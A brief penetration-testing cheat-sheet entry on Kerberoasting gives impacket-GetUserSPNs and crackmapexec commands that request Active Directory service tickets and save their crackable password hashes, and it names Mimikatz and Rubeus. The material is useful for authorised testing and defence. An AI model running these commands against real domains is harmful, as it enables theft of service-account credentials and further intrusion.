# Kerberoasting
By default, all standard domain users can request a copy of all service accounts ST (with SPN value set) along with their correlating password hashes.
`impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <IP>`
`impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <IP> -outputfile kerb.hash`
`impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <IP> -request`
`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT.TXT>`
`Mimikatz`
`Rubeus`